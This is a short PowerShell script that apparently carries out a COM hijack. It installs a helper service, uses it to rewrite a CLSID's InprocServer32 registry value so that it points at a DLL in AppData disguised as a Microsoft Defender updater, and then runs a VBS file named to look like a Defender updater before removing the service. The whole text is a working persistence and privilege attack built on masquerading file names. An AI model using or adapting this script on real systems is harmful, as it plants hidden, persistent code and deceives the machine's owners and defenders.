$svc = ".\sysme.exe"
$regPath = "SOFTWARE\Classes\CLSID\{0358B920-0AC7-461F-98F4-58E32CD89148}\InprocServer32"
$newValue = "C:\Users\auton\AppData\Roaming\Microsoft\Defender\1.0.3\ms_defender_updater.dll"
$setreg = ".\SetRegistryValue.exe"
$cmd = { param($c) & $svc --run "cmd.exe /c cd `"$PWD`" && $c" }
& $svc --install-service
& $cmd "$setreg `"$regPath`" `"$newValue`""
Start-Process wscript.exe "msdefender_updater_v1.0.3.vbs" -Wait
& $svc --remove-service